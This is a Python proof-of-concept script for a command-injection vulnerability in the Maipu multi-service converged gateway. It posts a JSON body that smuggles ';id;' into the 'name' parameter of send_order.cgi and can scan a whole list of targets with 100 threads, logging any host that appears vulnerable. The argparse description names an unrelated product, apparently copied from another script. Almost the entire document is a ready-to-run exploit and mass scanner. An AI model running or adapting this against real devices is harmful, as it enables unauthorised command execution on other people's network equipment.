#迈普-多业务融合网关命令执行
#title="迈普多业务融合网关"
import requests,sys,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parser = argparse.ArgumentParser(description="用友GRPA")

    parser.add_argument('-u','--url',dest='url',type=str,help='Please inpur url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input flie')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"usage：{sys.argv[0]} -h or --help")
def poc(target):
    payload = "/send_order.cgi?parameter=operation"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
        'Content-Length': '40',
    }
    data = '{"opid":"1","name":";id;","type":"rest"}'
    try:
        res1 = requests.post(url=target+payload,json=data,verify=False,timeout=10,headers=headers)
        if '"type":1' in res1.content.decode('utf-8'):
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()